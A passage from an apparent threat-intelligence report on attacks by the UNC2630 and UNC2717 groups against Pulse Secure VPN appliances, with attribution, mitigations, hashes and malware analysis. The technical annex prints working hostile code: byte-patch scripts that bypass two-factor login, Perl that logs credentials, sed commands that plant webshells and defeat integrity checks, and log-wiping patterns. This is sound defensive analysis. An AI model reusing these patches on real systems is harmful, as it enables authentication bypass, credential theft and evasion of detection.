government and law enforcement agencies to investigate the threat, as well as develop recommendations and mitigations for affected Pulse Secure VPN appliance owners. As part of their investigation, Ivanti has released mitigations for a vulnerability exploited in relation to this campaign as well as the Pulse Connect Secure Integrity Tool to assist with determining if systems have been impacted. Details Early this year, Mandiant investigated multiple intrusions at defense, government, and financial organizations around the world. In each intrusion, the earliest evidence of attacker activity traced back to DHCP IP address ranges belonging to Pulse Secure VPN appliances in the affected environment. In many cases, we were not able to determine how actors obtained administrator-level access to the appliances. However, based on analysis by Ivanti, we suspect some intrusions were due to the exploitation of previously disclosed Pulse Secure vulnerabilities from 2019 and 2020 while other intrusions were due to the exploitation of CVE-2021-22893 . We observed UNC2630 harvesting credentials from various Pulse Secure VPN login flows, which ultimately allowed the actor to use legitimate account credentials to move laterally into the affected environments. In order to maintain persistence to the compromised networks, the actor utilized legitimate, but modified, Pulse Secure binaries and scripts on the VPN appliance. This was done to accomplish the following: Trojanize shared objects with malicious code to log credentials and bypass authentication flows, including multifactor authentication requirements. We track these trojanized assemblies as SLOWPULSE and its variants. Inject webshells we currently track as RADIALPULSE and PULSECHECK into legitimate Internet-accessible Pulse Secure VPN appliance administrative web pages for the devices. Toggle the filesystem between Read-Only and Read-Write modes to allow for file modification on a typically Read-Only filesystem. Maintain persistence across VPN appliance general upgrades that are performed by the administrator. Unpatch modified files and delete utilities and scripts after use to evade detection. Clear relevant log files utilizing a utility tracked as THINBLOOD based on an actor defined regular expression. In a separate incident in March 2021, we observed UNC2717 using RADIALPULSE, PULSEJUMP, and HARDPULSE at a European organization. Although we did not observe PULSEJUMP or HARDPULSE used by UNC2630 against U.S. DIB companies, these malware families have shared characteristics and serve similar purposes to other code families used by UNC2630. We also observed an OpenSSL library file modified in similar fashion as the other trojanized shared objects. We believe that the modified library file, which we’ve named LOCKPICK, could weaken encryption for communications used by the appliance, but do not have enough evidence to confirm this. Due to a lack of context and forensic evidence at this time, Mandiant cannot associate all the code families described in this report to UNC2630 or UNC2717. We also note the possibility that one or more related groups is responsible for the development and dissemination of these different tools across loosely connected APT actors. It is likely that additional groups beyond UNC2630 and UNC2717 have adopted one or more of these tools. Despite these gaps in our understanding, we included detailed analysis, detection techniques, and mitigations for all code families in the Technical Annex. SLOWPULSE During our investigation into the activities of UNC2630, we uncovered a novel malware family we labeled SLOWPULSE. This malware and its variants are applied as modifications to legitimate Pulse Secure files to bypass or log credentials in the authentication flows that exist within the legitimate Pulse Secure shared object libdsplibs.so . Three of the four discovered variants enable the attacker to bypass two-factor authentication. A brief overview of these variants is covered in this section, refer to the Technical Annex for more details. SLOWPULSE Variant 1 This variant is responsible for bypassing LDAP and RADIUS-2FA authentication routines if a secret backdoor password is provided by the attacker. The sample inspects login credentials used at the start of each protocol’s associated routine and strategically forces execution down the successful authentication patch if the provided password matches the attacker's chosen backdoor password. LDAP Auth Bypass The routine DSAuth::LDAPAuthServer::authenticate begins the LDAP authentication procedure. This variant inserts a check against the backdoor password after the bind routine so that the return value can be conditionally stomped to spoof successful authentication. Figure 1: LDAP Auth Bypass RADIUS Two Factor Auth Bypass The routine DSAuth::RadiusAuthServer::checkUsernamePassword begins the RADIUS-2FA authentication procedure. This variant inserts checks against the backdoor password after the RADIUS authentication packet is received back from the authentication server. If the backdoor password is provided by the attacker, the packet type and successful authentication status flags are overwritten to spoof successful authentication. Figure 2: Radius-2FA Bypass SLOWPULSE Variant 2 ACE Two Factor Auth Credential Logging This variant logs credentials used during the ACE-2FA authentication procedure DSAuth::AceAuthServer::checkUsernamePassword . Rather than bypassing authentication, this variant logs the username and password to a file for later use by the attacker. Figure 3: ACE Auth Credential Log SLOWPULSE Variant 3 ACE Two Factor Auth Bypass This variant is responsible for bypassing the ACE-2FA logon procedure starting with DSAuth::AceAuthServer::checkUsernamePassword . The flow of the authentication procedure is modified to bypass the routine responsible for verifying the username and password if the backdoor password is provided. With this modification the attacker can spoof successful authentication. Figure 4: ACE Auth Bypass Variant SLOWPULSE Variant 4 RealmSignin Two Factor Auth Bypass This variant bypasses the RealmSignin::runSecondaryAuth procedure of the Pulse Secure VPN. The inserted logic modifies the execution flow of a specific step of the login process to spoof successful authentication. We believe that this may be a two-factor authentication bypass. Figure 5: RealmSignIn 2FA Auth Bypass Attribution We are in the early stages of gathering evidence and making attribution assessments and there are a number of gaps in our understanding of UNC2630, UNC2717, and these 12 code families. Nevertheless, the Mandiant and Ivanti teams are proactively releasing this analysis to assist network defenders in triaging and identifying malicious activity on affected appliances. Mandiant is able to assess that: UNC2630 targeted U.S. DIB companies with SLOWPULSE, RADIALPULSE, THINBLOOD, ATRIUM, PACEMAKER, SLIGHTPULSE, and PULSECHECK as early as August 2020 until March 2021. We suspect UNC2630 operates on behalf of the Chinese government and may have ties to APT5 UNC2717 targeted global government agencies between October 2020 and March 2021 using HARDPULSE, QUIETPULSE, AND PULSEJUMP. We do not have enough evidence about UNC2717 to determine government sponsorship or suspected affiliation with any known APT group. We do not have enough information about the use of LOCKPICK to make an attribution statement. UNC2630 UNC2630’s combination of infrastructure, tools, and on-network behavior appear to be unique, and we have not observed them during any other campaigns or at any other engagement. Despite these new tools and infrastructure, Mandiant analysts noted strong similarities to historic intrusions dating back to 2014 and 2015 and conducted by Chinese espionage actor APT5. We have also uncovered limited evidence to suggest that UNC2630 operates on behalf of the Chinese government. Analysis is still ongoing to determine the full scope of the activity that maybe related to the group. Although we are not able to definitively connect UNC2630 to APT5, or any other existing APT group, a trusted third party has uncovered evidence connecting this activity to historic campaigns which Mandiant tracks as Chinese espionage actor APT5. While we cannot make the same connections, the third party assessment is consistent with our understanding of APT5 and their historic TTPs and targets. APT5 has shown significant interest in compromising networking devices and manipulating the underlying software which supports these appliances. They have also consistently targeted defense and technology companies in the U.S., Europe, and Asia. As early as 2014, Mandiant Incident Response discovered APT5 making unauthorized code modifications to files in the embedded operating system of another technology platform. In 2015, APT5 compromised a U.S. telecommunications organization providing services and technologies for private and government entities. During this intrusion, the actors downloaded and modified some of the router images related to the company’s network routers. Also during this time, APT5 stole files related to military technology from a South Asian defense organization. Observed filenames suggest the actors were interested in product specifications, emails concerning technical products, procurement bids and proposals, and documents on unmanned aerial vehicles (UAVs). APT5 persistently targets high value corporate networks and often re-compromises networks over many years. Their primary targets appear to be aerospace and defense companies located in the U.S., Europe, and Asia. Secondary targets (used to facilitate access to their primary targets) include network appliance manufacturers and software companies usually located in the U.S. Recommendations All Pulse Secure Connect customers should assess the impact of the Pulse Secure mitigations and apply it if possible. Organizations should utilize the most recent version of Pulse Secure’s Integrity Assurance utility released on March 31, 2021. If a device fails this Integrity Assurance utility, network administrators should follow the instructions here and contact their Pulse CSR for additional guidance. Organizations should examine available forensic evidence to determine if an attacker compromised user credentials. Ivanti highly recommends resetting all passwords in the environment and reviewing the configuration to ensure no service accounts can be used to authenticate to the vulnerability. Additional detections, mitigations and relevant MITRE ATT&CK techniques are included in the Technical Annex. Sample hashes and analysis are included to enable defenders to quickly assess if their respective appliances have been affected. Yara rules, Snort rules, and hashes are published on Mandiant’s GitHub page .

Malicious logic is inserted at the end of legitimate logic to respond to POST requests. We believe this webshell may be responsible for placing additional webshells and used to modify legitimate system components resulting in the other observed malware families due to its functionality. The malicious logic inserts a branch condition to respond to HTTP POST requests rather than just the typical GET requests expected of the legitimate code. If GET requests are performed the legitimate logic is still invoked. POST requests have a series of parameters checked for existence to determine which command to invoke. This logic is: POST params Invoked Command cert writefile img, name with nonempty value readfile img set to empty string \"\", name execcmd anything else invoke original legitimate logic Figure 7: Webshells respond to POSTs All incoming and outgoing requests are base64 encoded/decoded and RC4 encrypted/decrypted. The scheme is simple. The first six characters of the data are a random key generated per request as a sort of nonce, with the static RC4 key appended. This nonce + phrase together act as the RC4 key. The phrase is not sent over the wire, only the nonce. This entire key is then used to encrypt/decrypt payload data that immediately follows the key. The form of data on the wire is: Outbound/Inbound: <6randbytes><encrypted_data> ^-RC4NONCE-^ Usage: <6randbytes><rc4_phrase><encrypted_data> ^-------RC4 KEY--------^ ReadFile This command accepts a base64 encoded, RC4 encrypted file name via the img parameter and opens it for read. The file contents are read in full then sent back to the attacker as base64 encoded, RC4 encrypted data with the headers \"Content-type: application/x-download\\n\" , and form header \"Content-Disposition: attachment; filename=tmp\\n\\n\" . WriteFile This command accepts a base64 encoded, RC4 encrypted filename via the cert parameter, and base64 encoded, RC4 encrypted file data via the parameter md5 . The filename is opened in write mode with the file data being written to the file before the file is closed. The results of this command are sent back to the attacker, using the headers \"Cache-Control: no-cache\\n\" and \"Content-type: text/html\\n\\n\" . Execute This command accepts a base64 encoded, RC4 encrypted commands via the name parameter. The malicious logic forbids the cd command and will respond with the text Error 404 if executed. All other commands will be executed via the system API with output piped to the file /tmp/1 . The full system command is <command> >/tmp/1 2>&1 . The output of this execution is read and sent back to the attacker base64 encoded, RC4 encrypted. The headers \"Cache-Control: no-cache\\n\" and \"Content-type: image/gif\\n\\n\" are used. The response appears to be masquerading as a GIF when sending back this command output. RADIALPULSE The file with the SHA256 hash d72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b is a modified Perl script associated with a PulseSecure web-based tool which causes usernames, passwords and information associated with logins to this application to be written to the file /tmp/dsstartssh.statementcounters . Retrieval of these login credentials must be achieved through other means such as an interactive login or a webshell. Persistence is achieved by the addition of compromised code which is continually served when requesting this PulseSecure webpage. An excerpt of the code related to credential stealing is shown as follows: my $realmName1 = $signin->getRealmInfo()->{name}; open(*fd, \">>/tmp/dsstartssh.statementcounters\"); syswrite(*fd, \"realm=$realmName1 \", 5000); syswrite(*fd, \"username=$username \", 5000); syswrite(*fd, \"password=$password\\n\", 5000); close(*fd); SLOWPULSE Variant 1 The file libdsplibs.so with SHA256 cd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68 is a trojanized ELF shared object belonging to the PulseSecure VPN server. The sample has been modified to bypass specific authentication mechanisms of the LDAP and RADIUS protocols. The sample hardcodes a backdoor key that will silently subvert auth failures if the correct backdoor key is passed, establishing a VPN connection as if auth succeeded. If the backdoor password is not used, authentication will fail as normal. In multiple locations assembly is written into the padding regions between legitimate functions. As these regions are very small, around 20 bytes, the malicious logic stitches itself together by unconditionally jumping between multiple padding regions. The assembly is written in a way very similar to mid-function hooks, where it is common to push and then pop all flags and registers before and after the injected logic. By preserving registers and flags in this way the malicious logic is able to execute and perform its malicious logic as a passive observer if desired, only effecting the control flow in specific conditions. This is employed in two locations, the LDAP and RADIUS authentication routines, DSAuth::LDAPAuthServer::authenticate and DSAuth::RadiusAuthServer::checkUsernamePassword respectively. LDAP Auth Bypass In the typical execution of DSAuth::LDAPAuthServer::authenticate the legitimate application constructs the C++ object DSAuth::LDAPAuthServer::ldap then passes it to DSLdapServer::bind with the username and password for login. This bind may fail or succeed which determines the authentication failure or success of the LDAP protocol. The malicious logic inserted into the application redirects execution before DSLdapServer::bind just after the ldap object is constructed. At this point in execution the username and password are easily extracted from memory with mid-function hooking techniques, which the sample copies to a code cave in memory between two functions as a temporary storage location. The malicious logic then invokes DSLdapServer::bind as the normal logic would, which sets the return register EAX to 0 or 1 for failure or success. A check is then executed where the temporary password copy made earlier is checked against a hardcoded backdoor password. If this check passes the backdoor logic actives by overwriting EAX to 1 to force the application down the execution path of successful authentication, even though in reality authentication failed. RADIUS Two Factor Auth Bypass In the typical execution of DSAuth::RadiusAuthServer::checkUsernamePassword the legitimate application sends a RADIUS-2FA auth packet with username and password via RadiusAuthPacket::sendRadiusPacket . The response is then retrieved and parsed by the routine DSAuth::RadiusAuthServer::handleResponse . After packet retrieval the packet type is verified to be 3, it's not known what this packet type specifies but this is the packet type of a successful authentication response. If the packet type check passes, then the sample reads a field of the packet that specifies if authentication was successful or not and then checks this status later. The inserted malicious logic hijacks execution just after DSAuth::RadiusAuthServer::handleResponse where the password sent to the RADIUS server is checked against a backdoor password. If this check passes the malicious logic overwrites the retrieved packet with values indicating that it's of type 3 and that authentication was successful. The malicious logic then rejoins the original execution flow where the packet type is checked. If written the spoofed values force the application down the execution path of successful authentication, even though in reality authentication failed. SLOWPULSE Variant 2 ACE Two Factor Auth Credential Logging We also identified a variant of SLOWPULSE (SHA256: 1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd ) which logs credentials used during ACE-2FA protocol authentication. The backdoor is implemented in the routine DSAuth::AceAuthServer::checkUsernamePassword . As part of the login procedure the username and password are retrieved then written into a map entry structure. The backdoor inserts an unconditional jump into the logon logic that takes this map entry structure, reads the username and password fields, then writes them to the file /home/perl/PAUS.pm in a+ (append) mode, using the format string %s:%s\\n . The backdoor then unconditionally jumps back into the normal control flow to continue the logon process as normal. SLOWPULSE Variant 3 ACE Two Factor Auth Bypass We Identified another variant of SLOWPULSE (SHA256: b1c2368773259fbfef425e0bb716be958faa7e74b3282138059f511011d3afd9 ) which is similar to SLOWPULSE VARIANT 2 the malicious logic lives within DSAuth::AceAuthServer::checkUsernamePassword , however this variant bypasses the logon procedure rather than login credentials. Typical execution of this routine calls DsSecID_checkLogin to validate the username and password which sets the EAX register to 1. The routine DSAuth::AceAuthServer::handleACEAuthResult then checks EAX to determine if auth was successful or not. The malicious logic hijacks execution immediately after the username and password fields are written to their map entries, then checks if the password matches the backdoor password. If the password matches, then the EAX register is overwritten to 1. This puts the program in the same state as if DsSecID_checkLogin had successfully executed, but unlike SLOWPULSE VARIANT 1 the original authentication routine is not called at all. The malicious logic then rejoins execution before DSAuth::AceAuthServer::handleACEAuthResult which will now pass. This forces the application down the execution path of successful authentication, even though in reality authentication would have failed. SLOWPULSE Variant 4 RealmSignin Two Factor Auth Bypass We identified a fourth variant of SLOWPULSE responsible for bypassing what may be the two-factor authentication step of the DSAuth::RealmSignin process. The backdoor is present within the function DSAuth::RealmSignin::runSigninStep .This routine is responsible for multiple steps of the login procedure and is implemented as a large switch statement. Case 11 of the switch statement typically calls the routines DSMap::setPrivacyKeyNames then DSAuth::RealmSignin::runSecondaryAuth . The malicious logic in this variant overwrites the call to DSAuth::RealmSignin::runSecondaryAuth with mov eax, 1. This forces application flow as if DSAuth::RealmSignin::runSecondaryAuth always succeeds, without ever calling it. We were not able to recover a file with these patches applied as the attacker removed their patches after use. However, we did uncover both the patcher and unpatcher utilities. We do not provide a hash for this file as we have not recovered it from a system in the field. This analysis was performed by replaying the changes performed by the patcher we did recover. SLOWPULSE Variant 2 Patcher As part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to insert the malicious logic into the original libdsplibs.so file. The file with SHA256: c9b323b9747659eac25cec078895d75f016e26a8b5858567c7fb945b7321722c is responsible for inserting SLOWPULSE V2 malicious logic to log ACE credentials. The patcher accepts two command line arguments, the path to the original binary and the patched output file path. The original binary is read into memory, patched, and then written to the output path. The assembly patches and offsets into the original binary are hardcoded. SLOWPULSE Variant 3 Patcher As part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to insert the malicious logic into the original libdsplibs.so file. The file with SHA256: 06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7 is responsible for inserting SLOWPULSE V3 malicious logic to bypass ACE logon authentication process. The patcher accepts four arguments. The first argument is the original binary path, the second the patched output file path, third is the backdoor bypass password, and fourth is the letter e specifying to apply patches. The sample reads the original binary into memory, applies the assembly patches associated with SLOWPULSE V3, as well as the provided bypass password, then written to the output path. The assembly patches, and all offsets including where to copy the bypass password are hardcoded. SLOWPULSE Variant 4 Patcher As part of our investigation into the SLOWPULSE family we recovered the utility the attacker used to insert the malicious logic into the original libdsplibs.so file. The file with SHA256: e63ab6f82c711e4ecc8f5b36046eb7ea216f41eb90158165b82a6c90560ea415 responsible for inserting the patch for SLOWPULSE V3. The patch applied overwrites a single call to DSAuth::RealmSignin::runSecondaryAuth with mov eax, 1 . This patcher utility is a simple bash script, unlike the previous patchers which were compiled applications likely written in C. The script in full is: printf '\\xB8' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31)) printf '\\x01' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B32)) printf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33)) printf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B34)) printf '\\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35)) SLOWPULSE Variant 4 UnPatcher As part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to remove the malicious logic into the original libdsplibs.so file for SLOWPULSE V4. The attacker chose to remove the patches applied to libdsplibs.so . The file with SHA256: b2350954b9484ae4eac42b95fae6edf7a126169d0b93d79f49d36c5e6497062a is the unpatcher utility for SLOWPULSE V4. This sample is also a simple bash script, in full it is: printf '\\xE8' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31)) printf '\\xE2' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B32)) printf '\\x08' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33)) printf '\\xD0' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B34)) printf '\\xFF' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35)) STEADYPULSE The file licenseserverproto.cgi (SHA256: 168976797d5af7071df257e91fcc31ce1d6e59c72ca9e2f50c8b5b3177ad83cc ) is a webshell implemented via modification of a legitimate Perl script used by a Pulse Secure tool which enables arbitrary command execution. The attacker inserted two blocks of Perl code that implement the webshell. The source code modifications are surrounded by comments that indicate the start and end of inserted code. The comment strings used are ##cgistart1 , ##cgiend1 , ##cgistart2 and ##cgiend2 . Although the exact purpose of these comment strings is unknown, the attacker may use them to facilitate updates to the malicious code or to allow for its quick removal if necessary. The Perl script enclosed in the tags ##cgistart1 and ##cgiend1 adds several lines to import Perl modules that are used by the webshell. It also adds a function to parse parameters of received command data. The script enclosed in the tags ##cgistart2 and ##cgiend2 is responsible for checking web requests designed to be executed by the webshell, if present. If no webshell request is found, the script passes execution to the legitimate Perl script for the webpage. The webshell portion of the script is invoked when it receives a form submission name=value pair of serverid matching a secret key. This causes the webshell to extract the string passed to it via the QUERY_STRING CGI environment variable. Individual key/value pairs delimited by the & character and are URL decoded. Although the script parses out all key/value pairs it receives, it specifically looks for and extracts data associated with the cmd parameter. If found, it will generate a form containing the extracted cmd to be executed and the previous serverid value along with a form submission button named Run . Upon submission, the webshell will execute the passed command on the victim host's command line and display the results to the attacker before exiting. If no cmd value was extracted, the webshell will simply output a </pre> HTML tag. PULSECHECK The file secid_canceltoken.cgi (SHA256: a1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1 ) is a webshell written in Perl that enables arbitrary command execution. With a properly formatted request, the script will execute webshell code. Otherwise, the legitimate welcome page of the Pulse Secure VPN software is presumably invoked. The script checks for web requests using the HTTP POST method and, if found, will further check the HTTP request headers for the CGI environment variable HTTP_X_KEY . If this header matches a backdoor key, then the malware will output the result of the command sent in the variable HTTP_X_CMD . This data is RC4 encrypted and base64-encoded. The passphrase to decrypt is sent in the environment variable HTTP_X_CNT . The webshell will set the content type to Content-type:text/html and the command output printed. Following this, the script exits. QUIETPULSE The file dsserver (SHA256: 9f6ac39707822d243445e30d27b8404466aa69c61119d5308785bf4a464a9ebd ) is a legitimate Perl script with malicious modifications to fork the child process /home/bin/dshelper . The dshelper script does not exist on a clean PulseSecure installation, this file is described as QUIETPULSE Utility Script. QUIETPULSE Utility Script The file dshelper (SHA256: c774eca633136de35c9d2cd339a3b5d29f00f761657ea2aa438de4f33e4bbba4 ) is a shell script invoked by a malicious version of dsserver that primarily functions as a utility script responsible for copying files and executing commands. Like the ATRIUM patcher, this script accesses /tmp/data, a path which is used during a system upgrade. This file is therefore, like the ATRIUM patcher, used by the attacker to maintain persistence. The script is set to execute in a loop where four main checks are executed every two minutes. The checks are as follows: Check 1 If /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi exists and is non-empty then execute: grep -c -s 'system($depara)' /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi It checks if the file has the contents system($depara) . If the file does not contain this content, then retrieve the first line of the file by executing: sed -n 1p /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi Then copy a file via: cp /home/webserver/htdocs/dana-na/auth/compcheckjava.cgi /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi Then replace the copy’s first line with the one retrieved from the sed above via: sed -i 1c\"<varies>\" /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi Check 2 If /tmp/data/root/home/bin/ exists as a directory, then check if the file /tmp/data/root/home/bin/dshelper does not exist. If it does not exist, then place it there by copying a file via: cp -p /home/bin/dshelper /tmp/data/root/home/bin/ Check 3 If /tmp/data/root/home/bin/dsserver exists and is non-empty then execute the following to check if the file does not contain the string exec(\"/home/bin/dshelper\") : grep -c -s 'exec(\"/home/bin/dshelper\")' /tmp/data/root/home/bin/dsserver If it doesn't then execute to insert the line: sed -i 's/for (;;)/my $monpid = fork();\\nif ($monpid == 0) {\\nexec(\\\"\\/home\\/bin\\/dshelper\\\");\\n}\\n&/g' /tmp/data/root/home/bin/dsserver Check 4 If the file /tmp/data/root/home/bin/check_integrity.sh exists and is non-empty, then check if the file contains the string exit 1 by executing: grep -c -s 'exit 1' /tmp/data/root/home/bin/check_integrity.sh If the file does contain this content, then execute the following to switch the content to exit 0 : sed -i 's/exit 1/exit 0/g' /tmp/data/root/home/bin/check_integrity.sh PULSEJUMP The file with SHA256: 7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a is a system information and credential harvesting Perl script. The sample writes information from multiple sources to the file /tmp/dsactiveuser.statementcounters in append mode. The sample begins by retrieving all auth servers via the API AuthAdmin::getAllAuthServers . and logs the results. Next, the sample logs all roles via the API DSRole::GeneralAdmin::getRoles and writes the values to the file. The sample may also retrieve and log additional information depending on the device configuration. HARDPULSE The file compcheckjava.cgi (SHA256: 1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc ) has the ability to read and write arbitrary files and may execute arbitrary commands depending on the implementation of a particular library function. The sample responds to HTTP GETs and PUTs. The GET path is not relevant, but the PUT path first checks if the incoming requests checkcode POST param is equal to a hardcoded passcode. If this check passes the sample inspects the param hashid to determine if it's non-empty. If non-empty the sample displays a prompt to the user that includes hardware information and then base64 decodes the param hashid and checks it against pulsesecure. If this matches a recoveryToken is generated which is the MD5 hash of 16 random bytes, with the result hash truncated to 8 characters. This token is then displayed to the user via the URL https://ive-host/dana-na/auth/recover[.]cgi?token=<varies> and the sample exits. If this check did not match then the sample passes the base64 decoded data to a routine DSSafe::psystem which may execute shell commands, however this implementation is not provided and is speculation. If the param hashid is empty the sample instead checks that the param m is non-empty. If so, it's matched against get and put which will read/write arbitrary files to the host, respectively. ATRIUM The file compcheckresult.cgi (SHA256: f2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90 ) is a webshell capable of arbitrary command execution. The sample has malicious logic inserted at the end of legitimate logic. The malicious logic inspects all requests of any type looking for the HTTP query parameter id . If this query parameter exists, the sample executes it verbatim on using the system API. The sample does not encode or obfuscate the command in any way. If the query parameter is not found in the request, then the original legitimate logic is invoked. Persistence Patcher The file DSUpgrade.pm (SHA256: 224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450 ) is a patcher utility script responsible for persisting webshells across a system upgrade. We’ve observed variants of this utility targeting the persistence of multiple webshell families, notably ATRIUM, STEADYPULSE, and PULSECHECK. Like previous patchers, this sample uses sed to insert malicious logic. The attacker likely chose DSUpgade.pm to host their patch logic as it is a core file in the system upgrade procedure, ensuring the patch is during updates. The patcher modifies content in /tmp/data as this directory holds the extracted upgrade image the newly upgraded system will boot into. This results in a persistence mechanism which allows the attacker to maintain access to the system across updates. my $cmd_x=\"sed -i '/echo_console \\\"Saving package\\\"/i( sed -i \\\\\\'/main();\\\\\\$/cif(CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\")){ print \\\\\\\\\\\"Cache-Control: no-cache\\\\\\\\\\\\\\\\n\\\\\\\\\\\"; print \\\\\\\\\\\"Content-type: text/html\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\"; my \\\\\\\\\\$na=CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\"); system(\\\\\\\\\\\"\\\\\\\\\\$na\\\\\\\"); } else{ &main(); }\\\\\\' /tmp/data/root$cgi_p; cp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl; cp -f /pkg/dspkginstall /tmp/data/root/pkg/; )'/pkg/do-install\"; The patcher also performs additional shell commands for unpacking a compressed package: system(\"/bin/mount -o remount,rw /dev/root /\"); system(\"/bin/tar\", \"-xzf\", \"/tmp/new-pack.tgz\", \"-C\", \"/tmp\",\"./installer\"); system(\"cp -f /tmp/installer/do-install /pkg/\"); system(\"cp -f /tmp/installer/VERSION /pkg/\"); system(\"cp -f /tmp/installer/sysboot-shlib /pkg/\"); system(\"cp -f /tmp/installer/losetup /pkg/\"); PACEMAKER The file memread (SHA256: 68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2 ) is a credential stealer. The sample has the usage information: Usage: memread [-t time(minute)] [-m size(MB)] [-s sleep_interval(second)] The sample starts by setting an alarm that kills the application after a configurable number of minutes, 14 by default. It then enters a loop which reads /proc/ entries every 2 seconds looking for a target application, this interval is also configurable. The target is found by opening /proc/<process_name>/cmdline for each entry in the folder and then reading this file looking for the string dswsd within the command line. Once found the target application's proc/<target_pid>/mem is opened, the process is attached to with PTRACE, then memory read in chunks up to 512 bytes in size. For each chunk, the string 20 30 20 0A 00 ( 0 \\n) is searched for as a needle. If found the sample splits the data by first space, then a dash -. Two dashes are expected to be found, and these are immediately converted into hex numbers, example form: -<number>. If the second number minus the first is > 8191 the sample reads the data starting at the file offset of the first number, up to a size specified by second number minus first number. Once the sample has read the process memory and found all memory data of interest the sample detaches PTRACE then the sample begins memory scanning the copied data. The sample tries to locate a sequence of 'flags' in memory one by one to locate what seem to be information the attacker wishes to steal. This information is not known, nor is the structure of it. The sequences scanned for generally have start and end scan sequences which in order scanned for, are: USER_START_FLAG: 3C 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 05 00 USER_END_FLAG: 3C 2F 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 00 PASSWORD_START_FLAG: 3C 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00 PASSWORD_END_FLAG: 3C 2F 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00 AUTHNUM_START_FLAG: 3C 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00 AUTHNUM_END_FLAG: 3C 2F 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00 If all these sequences are found, the data between the start and end is extracted and eventually formatted and written to the file /tmp/dsserver-check.statementcounters . The approximate format of this data is: Name:<username> || Pwd:<password> || AuthNum:<authnumber>\\n The sample replaces the following URL encoded values with their ascii representation for the password: &amp; ->  & &lt;  ->  < &gt;  ->  > PACEMAKER Launcher Utility As part of our investigation into PACEMAKER we were able to retrieve a simple bash script responsible for launching the credential stealer. The launcher script hash SHA256 4c5555955b2e6dc55f52b0c1a3326f3d07b325b112060329c503b294208960ec launches PACEMAKER from a hardcoded path with options specifying a 16MB memory read size and a memory scan interval of 2 seconds, with a variable self-kill time. #!/bin/bash /home/bin/memread -t $1 -m 16 -s 2 & THINBLOOD Log Wiper Utility The file dsclslog with SHA256 88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079 is a log wiper utility. The sample provides the usage information: Usage: dsclslog -f [events|access] -r [Regex1,Regex2,Regex3,...] The –f flag specifies if the file log.events.vc0 or log.access.vc0 within the directory /home/runtime/logs should be modified. To perform its log cleaning operations the sample first makes two copies of whichever log file was chosen, but uses .vc1 and .vc2 as the extension for the new files. The file with the .vc1 is used to search for entries that match the given entries, and the file with the .vc2 extension is used as a temporary file where the cleaned log is written. After generating both files and log cleaning is finished the sample executes the following commands via the system API to overwrite the original log with the cleaned version, then removes the intermediate: mv /home/runtime/logs/log.<logtype>.vc2 /home/runtime/logs/log.<logtype>.vc0 rm /home/runtime/logs/log.<logtype>.vc1 THINBLOOD LogWiper Utility Variant The file clear_log.sh (SHA256: 1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9 ) is a BASH script responsible for zeroing log lines that match a given regex pattern. The sample is similar to the compiled THINBLOOD Log Wiper but edits logs in-place with sed rather than making temporary copies. The sed commands used are: sed -i \"s/.\\x00[^\\x00]*<regex_string>[^\\x00]*\\x09.\\x00//g\" /data/runtime/logs/<logfile> sed -i \"s/\\x<hex_char>\\x00[^\\x00]*$2[^\\x00]*\\x09\\x<hex_char>\\x00//g\" /data/runtime/logs/<logfile> The sample embeds the usage information: usage: /home/bin/bash clear_log.sh [logfile] [keyword(regex)] LOCKPICK The file libcrypto.so (SHA256: 2610d0372e0e107053bc001d278ef71f08562e5610691f18b978123c499a74d8 ) is a shared object containing cryptographic logic from openssl. The sample contains a modification to the routine bnrand_range that breaks the security of the random numbers generated. There are three paths in this routine for generating a random big number between a given range. The first case is unmodified and generates a zeroed big number, the other two cases are patched so that a constant value overwrites the generated random value and always returns success. This breaks the random number generation by replacing it with a value the attacker knows in all cases. LOCKPICK Patcher The file with the hash b990f79ce80c24625c97810cb8f161eafdcb10f1b8d9d538df4ca9be387c35e4 is 